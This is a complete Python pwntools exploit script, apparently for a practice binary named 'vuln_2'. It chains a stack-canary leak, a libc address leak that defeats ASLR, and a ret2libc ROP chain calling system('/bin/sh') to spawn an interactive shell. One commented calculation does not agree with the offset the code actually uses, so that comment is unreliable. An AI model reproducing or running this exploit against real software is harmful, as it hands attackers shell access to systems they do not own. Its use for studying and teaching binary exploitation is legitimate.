#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

# We overflow saved RIP after 280, so saved RBP is 272 and canary is 264
overflow_offset_canary = 264

# -- LEAK #1 - CANARY (defeat stack cookie)

# first run to leak the stack cookie
p = process("./vuln_2")
# gdb.attach(p, api=True)

# 264 bytes up to the canary, +1 to make 265; that overwrites the '00' in the
# stack cookie's LSB so that `puts` prints it.
payload = b"A" * (overflow_offset_canary + 1)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.recvuntil(b"Welcome \n" + payload)

# first leak
leak_canary = u64(b"\x00" + p.recv(7))  # Add \x00 back in!
info(f"leak STACK CANARY: {hex(leak_canary)}")

pause()

# Send 'n' so we can run the program a second time
p.sendafter(b"is this name correct? (y/n)?\n", b"n\n")

# -- LEAK #2 - LIBC ADDR (defeat ALSR)

# 264 bytes up top canary, +8 +8 +8 +8 to move RSP over the canary, saved RBP
# and saved RIP for `overflow()`, and saved RBP for the `libc` function;
# brings us to the saved RIP for the libc function - `__libc_start_main+243`.
payload = b"A" * (overflow_offset_canary + 8 + 8 + 8 + 8)

p.sendafter(b"Hey, whats your name!?\n", payload)
p.recvuntil(b"Welcome \n" + payload)

# second leak
leak_libc = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"leak __libc_start_main+243 = {hex(leak_libc)}")

# Calc libc base
"""
In [10]: hex(0x7ffff7dc5923 - 0x7ffff7d9e000) <- __libc_start_main+243 - default_libc_base
Out[10]: '0x2fd5'
"""
libc_start_main_plus243_offset = 0x276B5
libc_base = leak_libc - libc_start_main_plus243_offset
info(f"libc_base = {hex(libc_base)}")

pause()

# Send 'n' so we can run the program a third time!
p.sendafter(b"is this name correct? (y/n)?\n", b"n\n")

# -- FINAL RUN

default_libc_base = 0x7FFFF7D9E000  # Per vmmap
system_addr = 0x7FFFF7DF1400  # `system()` in libc for the default base
bin_sh_addr = 0x7FFFF7F4CF24  # `"/bin/sh"` in libc for the default base

# Calculate the actual addresses of `system` and `"/bin/sh"` with ALSR in mind.
system_addr_offset = system_addr - default_libc_base
bin_sh_addr_offset = bin_sh_addr - default_libc_base
system_addr = libc_base + system_addr_offset
bin_sh_addr = libc_base + bin_sh_addr_offset

# [INFO] File: /usr/lib/libc.so.6
# 0x000000000010194a: pop rdi; ret;
pop_rdi_ret_offset = 0x10194A
pop_rdi_ret = libc_base + pop_rdi_ret_offset

# [INFO] File: vuln
# 0x000000000040101a: ret;
ret = 0x40101A

# construct payload
payload = b"A" * overflow_offset_canary
payload += p64(leak_canary)  # Restore the canary
payload += p64(0xDEADC0DEDEADC0DE)  # overwrites saved RBP
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
# align the stack to 16-bytes so `movaps` instruction in `system()` doesn't crash
payload += p64(ret)
payload += p64(system_addr)

# send final payload
# pause()
p.sendafter(b"Hey, whats your name!?\n", payload)
pause()
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
